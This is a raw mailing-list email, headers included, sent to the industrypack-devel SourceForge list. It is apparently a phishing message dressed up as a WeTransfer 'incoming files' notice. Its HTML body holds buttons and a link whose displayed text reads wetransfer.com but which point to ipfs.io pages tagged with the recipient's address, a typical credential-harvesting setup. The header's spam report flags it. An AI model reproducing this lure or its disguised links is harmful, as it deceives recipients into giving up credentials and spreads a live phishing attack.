Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id DCB218D446E
	for <lists+industrypack-devel@lfdr.de>; Thu, 30 May 2024 06:00:17 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sCWxa-0006GB-Rp
	for lists+industrypack-devel@lfdr.de;
	Thu, 30 May 2024 04:00:16 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@wetransfer.com>) id 1sCWxY-0006G5-QW
 for industrypack-devel@lists.sourceforge.net;
 Thu, 30 May 2024 04:00:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=fEtOteUBm7TGrU04541cvKkzTLWYthbhUsZgY+Id59Y=; b=OuORam6p84trqrAXjmQtNhwFKE
 Jynts9tvoE0tuDIxOaplLDKukVzr0hkzBsEbuvUKPAui66KvbsZM2HkPlf9okH+hPF4vt5TmwR9F8
 NRqAz8RAjGCznjy2lqZpIq5uWfsQvsSAKgCP/kOHAOpgvsA9k6/HA0DNf+8eNiacu04M=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=fEtOteUBm7TGrU04541cvKkzTLWYthbhUsZgY+Id59Y=; b=Q
 ZGneAEIt5dsHMTdiFOWZpsvH5dMb74RtonmTK911ouO5/bT/IVY8PshfOoFdqMSdaz9+8f6WYnC5d
 B36iMYCMZq24Voc4PJsm0owRBO6VnIOTClFNyRILD+7s7K/RrtZBGBAKpzmmf38brb1aR+LdZG3lV
 QzfORbRDdajobrWA=;
Received: from [87.236.146.149] (helo=s889929.srvape.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sCWxW-00079s-74 for industrypack-devel@lists.sourceforge.net;
 Thu, 30 May 2024 04:00:13 +0000
Received: from wetransfer.com (localhost [IPv6:::1])
 by s889929.srvape.com (Postfix) with ESMTP id 032368C8005
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 30 May 2024 05:37:13 +0200 (CEST)
To: industrypack-devel@lists.sourceforge.net
Date: 29 May 2024 20:37:11 -0700
Message-ID: <20240529203711.AA6C88D75C0FD216@wetransfer.com>
MIME-Version: 1.0
X-Spam-Score: 7.5 (+++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  view files on Wetransfer. only industrypack-devel@lists.sourceforge.net
    can download 3 items, 38.2 MB in total ・ Expires on 31st May 2024 Get your
    files Download link https:// wetransfer.com/downlo [...] 
 
 Content analysis details:   (7.5 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: ipfs.io]
  0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
                             DNSWL was blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [87.236.146.149 listed in list.dnswl.org]
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  2.0 MIXED_HREF_CASE        Has href in mixed case
  1.3 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
  2.5 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
  0.3 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
  0.0 FROM_MISSP_EH_MATCH    From misspaced, matches envelope
  0.0 BODY_URI_ONLY          Message body is only a URI in one line of text or
                             for an image
X-Headers-End: 1sCWxW-00079s-74
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net You
 have an incoming WeTransfer file________________
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: WeTransfer via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: WeTransfer <noreply@wetransfer.com>
Content-Type: multipart/mixed; boundary="===============4266895462496137998=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4266895462496137998==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.16438"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
; WIDTH: 600px; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: co=
llapse; TABLE-LAYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(34,34,34); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; FONT-STYLE: nor=
mal; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px;=
 BORDER-SPACING: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDIN=
G-RIGHT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 26px; FONT-FAMILY: &quot;Se=
goe UI&quot;, &quot;SanFrancisco Display&quot;, Arial, sans-serif; WIDTH: 4=
40px; COLOR: rgb(23,24,26); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PAD=
DING-TOP: 60px; OUTLINE-STYLE: none; PADDING-LEFT: 80px; MARGIN: 0px; LINE-=
HEIGHT: 30px; PADDING-RIGHT: 80px" valign=3D"top" align=3D"center"><SPAN st=
yle=3D"BOX-SIZING: border-box; DISPLAY: inline-flex"><FONT style=3D"BOX-SIZ=
ING: border-box" size=3D2>view files on Wetransfer.<BR style=3D"BOX-SIZING:=
 border-box">
only&nbsp; industrypack-devel@lists.sourceforge.net&nbsp;&nbsp;&nbsp;can do=
wnload</FONT></SPAN></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: &quot;Fa=
kt Pro&quot;, &quot;Segoe UI&quot;, &quot;SanFrancisco Display&quot;, Arial=
, sans-serif; WIDTH: 440px; COLOR: rgb(106,109,112); OUTLINE-WIDTH: medium;=
 PADDING-BOTTOM: 0px; PADDING-TOP: 20px; OUTLINE-STYLE: none; PADDING-LEFT:=
 80px; MARGIN: 0px; LINE-HEIGHT: 23px; PADDING-RIGHT: 80px" valign=3D"top" =
align=3D"center">3 items, 38.2 MB in total &#12539; Expires on&nbsp;31st Ma=
y 2024</TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 280px; OUTLINE-WIDTH: medium; P=
ADDING-BOTTOM: 40px; PADDING-TOP: 40px; OUTLINE-STYLE: none; PADDING-LEFT: =
160px; MARGIN: 0px; PADDING-RIGHT: 160px" valign=3D"top" align=3D"left">
<table style=3D"WIDTH: 280px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixe=
d; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-SPACING: 0px; PADDING-RIG=
HT: 0px" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 280px; OUTLINE-WIDTH: medium; P=
ADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0p=
x; MARGIN: 0px; PADDING-RIGHT: 0px" valign=3D"top" align=3D"left">
<A style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "Fakt Pro=
 Medium", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; COLOR: rgb=
(255,255,255); PADDING-BOTTOM: 15px; TEXT-ALIGN: center; PADDING-TOP: 15px;=
 PADDING-LEFT: 20px; DISPLAY: block; PADDING-RIGHT: 20px; BACKGROUND-COLOR:=
 rgb(82,104,255); text-decoration-line: none; border-radius: 25px' href=3D"=
https://ipfs.io/ipfs/bafybeidy6lttpshdyb467ib767wgcj7oswourgccx5ddhkse2t5tp=
s5xei/jdyguh.html#industrypack-devel@lists.sourceforge.net" rel=3Dnoreferre=
r>
<SPAN style=3D"BOX-SIZING: border-box">Get your files</SPAN></A></TD></TR><=
/TBODY></TABLE></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 440px; OUTLINE-WIDTH: medium; P=
ADDING-BOTTOM: 0px; PADDING-TOP: 40px; OUTLINE-STYLE: none; PADDING-LEFT: 8=
0px; MARGIN: 0px; PADDING-RIGHT: 80px" valign=3D"top" align=3D"left">
<table style=3D"WIDTH: 440px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixe=
d; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-SPACING: 0px; PADDING-RIG=
HT: 0px" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1px; WIDTH: 440px; BORDER-B=
OTTOM: rgb(244,244,244) 2px solid; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0=
px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; =
LINE-HEIGHT: 0; PADDING-RIGHT: 0px" valign=3D"top" align=3D"left">&nbsp;</T=
D></TR></TBODY></TABLE></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: &quot;Fa=
kt Pro&quot;, &quot;Segoe UI&quot;, &quot;SanFrancisco Display&quot;, Arial=
, sans-serif; WIDTH: 440px; WORD-BREAK: break-all; COLOR: rgb(121,124,127);=
 OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 50px; OUTLINE-STY=
LE: none; PADDING-LEFT: 80px; MARGIN: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT=
: 80px" valign=3D"top" align=3D"left">
<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-FAMILY: "Segoe=
 UI", "SanFrancisco Display", Arial, sans-serif; COLOR: rgb(23,24,26)'>Down=
load link</SPAN><BR style=3D"BOX-SIZING: border-box"><A href=3D"https://ipf=
s.io/ipfs/QmcmcRk11Gn8C4EQu2kpyUgX8FtDvTfEKbnzzf3kEcW44s/jsg.html#industryp=
ack-devel@lists.sourceforge.net"><SPAN style=3D"BOX-SIZING: border-box; COL=
OR: rgb(82,104,255)">https://<SPAN style=3D"BOX-SIZING: border-box">&nbsp;w=
etransfer</SPAN>.com/<WBR>downloads/<WBR></SPAN>
://ipfs.io/ipfs/QmcmcRk11Gn8C4EQu2kpyUgX8FtDvTfEKbnzzf3kEcW44s/jsg.html#ind=
ustrypack-devel@lists.sourceforge.net</A></TD></TR></TBODY></TABLE></P></BO=
DY></HTML>


--===============4266895462496137998==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4266895462496137998==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4266895462496137998==--
